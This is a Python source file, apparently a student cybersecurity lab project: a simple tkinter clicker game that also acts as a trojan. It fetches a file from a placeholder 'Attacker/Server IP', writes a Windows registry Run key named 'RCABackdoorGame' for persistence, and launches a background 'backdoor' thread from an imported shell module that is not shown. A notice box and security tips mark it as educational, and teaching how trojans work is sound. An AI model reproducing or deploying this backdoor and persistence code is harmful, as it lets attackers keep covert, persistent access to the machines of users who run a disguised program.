import tkinter as tk
from tkinter import messagebox
import threading
import os
import sys
import requests
import random
import communication # Background shell logic

# 1. Dependency Checker (Requirement 1 - Download from Server)
def check_dependencies():
    required_file = "assets_lib.txt"
    if not os.path.exists(required_file):
        print("[!] Missing dependencies. Downloading from local server...")
        try:
            # Change this to your Attacker/Server IP
            url = "http://127.0.0.1:8080/assets_lib.txt" 
            r = requests.get(url, timeout=5)
            with open(required_file, "wb") as f:
                f.write(r.content)
            print("[+] Dependencies installed successfully.")
        except Exception as e:
            print(f"[-] Download failed. Using local fallback. Error: {e}")
            with open(required_file, "w") as f:
                f.write("Local Fallback Data")

# 2. Persistence (Requirement 3 - Windows Registry)
def set_persistence():
    if sys.platform == "win32":
        import winreg
        try:
            path = os.path.realpath(sys.argv[0])
            key = winreg.HKEY_CURRENT_USER
            key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(open_key, "RCABackdoorGame", 0, winreg.REG_SZ, path)
            winreg.CloseKey(open_key)
            print("[+] Persistence established in Registry.")
        except Exception as e:
            print(f"[-] Persistence failed (Run as Admin?): {e}")

# 3. Simple Game UI & Security HUD (Innovation Points)
def start_game():
    root = tk.Tk()
    root.title("RCA Cybersecurity Lab Game")
    root.geometry("400x300")
    
    # Game Logic
    label_score = tk.Label(root, text="Score: 0", font=("Arial", 24))
    label_score.pack(pady=20)
    
    def increment():
        current = int(label_score.cget("text").split(":")[1])
        label_score.config(text=f"Score: {current + 1}")

    btn = tk.Button(root, text="CLICK TO PLAY", command=increment, bg="green", fg="white", font=("Arial", 12))
    btn.pack(pady=10)
    
    # Innovation: Security Awareness HUD
    tips = [
        "SECURITY TIP: Never run software from untrusted sources.",
        "SECURITY TIP: Monitor your Registry for suspicious 'Run' keys.",
        "SECURITY TIP: Firewalls help block unauthorized reverse shells.",
        "SECURITY TIP: Always use a Virtual Machine for testing code."
    ]
    hud = tk.Label(root, text=random.choice(tips), fg="red", font=("Arial", 9, "italic"), wraplength=350)
    hud.pack(side="bottom", pady=20)
    
    # Requirement: Notify user (Grading criteria)
    messagebox.showinfo("Educational Lab", "Notice: This game is running a background communication thread for a RCA cybersecurity project.")
    
    root.mainloop()

if __name__ == "__main__":
    check_dependencies()
    set_persistence()
    
    # Start the "Backdoor" thread (Requirement 2 & 4 - No Interruption)
    threading.Thread(target=communication.start_connection, daemon=True).start()
    
    # Start the game on the main thread
    start_game()